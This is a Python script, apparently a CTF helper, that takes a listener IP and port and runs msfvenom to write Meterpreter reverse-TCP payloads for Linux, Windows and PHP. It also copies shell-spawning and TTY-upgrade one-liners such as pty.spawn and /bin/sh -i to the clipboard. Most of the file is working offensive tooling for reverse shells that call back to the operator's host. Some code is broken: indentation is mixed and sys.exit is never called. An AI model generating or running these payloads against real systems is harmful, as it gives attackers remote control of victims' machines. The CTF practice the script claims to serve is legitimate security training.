#!/usr/bin/env python
# -*- coding: utf-8 -*-
#title           :shellcode.py
#description     :Help generate shellcode for a ctf
#author          :
#date            :
#version         :0.1
#usage           :python shellcode lhost lport
#=======================================================================
 
# Import the modules needed to run the script.
import sys, os
import pyperclip
if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0) 

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]

# Main definition - constants
menu_actions  = {}  

 
# =======================
#     MENUS FUNCTIONS
# =======================
 
# Main menu
def main_menu():
    os.system('clear')
    
    print "Working Directory is /root/ctf/,\n"
    print "What code are you looking for?"
    print "1. Reverse Shells"
    print "2. TTY Code"
    print "\n0. Quit"
    choice = raw_input(" >>  ")
    exec_menu(choice)
 
    return

# Execute menu
def exec_menu(choice):
    os.system('clear')
    ch = choice.lower()
    if ch == '':
        menu_actions['main_menu']()
    else:
        try:
            menu_actions[ch]()
        except KeyError:
            print "Invalid selection, please try again.\n"
            menu_actions['main_menu']()
    return

# Menu 1
def menu1():
    print "Reverse Shells will be written /root/ctf/shell.*\n"
    print "20. Linux MSVENOM"
    print "21. Windows MSVENOM"
    print "22. PHP MSVENOM"
    print "9. Back"
    print "0. Quit"
    choice = raw_input(" >>  ")
    exec_menu(choice)
    return
 
 
# Menu 2
def menu2():
    print "Which one do you want copied to clipboard\n"
    print "10. python -c 'import pty; pty.spawn(\"/bin/sh\")'"
    print "11. echo os.system('/bin/bash')"
    print "12. /bin/sh -i"
    print "13. perl: exec \"/bin/sh\";"
    print "9. Back"
    print "0. Quit" 
    choice = raw_input(" >>  ")
    exec_menu(choice)
    return
 
# Back to main menu
def back():
    menu_actions['main_menu']()
 
# Exit program
def exit():
    sys.exit()

# python menu
def python():
	os.system('clear')
	print "Which one do you want to copy to clipboard"
	print "10. python -c 'import pty; pty.spawn(\"/bin/sh\")'"
	choice = raw_input(" >>  ")
	exec_menu(choice)
	return

# python tty
def python_tty():
	pyperclip.copy('python -c \'import pty; pty.spawn("/bin/sh")\'')
	sys.exit

#bash tty code	
def bash_tty():
	pyperclip.copy('echo os.system(\'/bin/bash\')')
	sys.exit

#bin code	
def bin_tty():
	pyperclip.copy('/bin/sh -i')
	sys.exit

#perl code
def perl_tty():
	pyperclip.copy('perl: exec "/bin/sh";')
	sys.exit

#MSVENOM Linux
def linux_msvenom():
	shellcode = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell.elf" % (IP_ADDR,PORT)
        msfvenom(shellcode)

#MSVENOM Windows
def windows_msvenom():
        shellcode = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe" %(IP_ADDR,PORT)
        msfvenom(shellcode)

#MSVENOM PHP
def php_msvenom():
	shellcode = "msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.php" % (IP_ADDR,PORT)
        msfvenom(shellcode)

def msfvenom(shellcode):
        warning ="Make sure you are using the correct payload in MSFConsole"
        os.system('clear')
        print "Writing Shell"
        print shellcode
        os.system(shellcode)
        print warning

# =======================
#    MENUS DEFINITIONS
# =======================
 
# Menu definition
menu_actions = {
    'main_menu': main_menu,
    '1': menu1,
    '2': menu2,
    '3': python,
    '10': python_tty,
    '11': bash_tty,
    '12': bin_tty,
    '13': perl_tty,
    '20': linux_msvenom,
    '21': windows_msvenom,
    '22': php_msvenom,
    '9': back,
    '0': exit,
}

 
# =======================
#      MAIN PROGRAM
# =======================
 
# Main Program
if __name__ == "__main__":
    # Launch main menu
    main_menu()
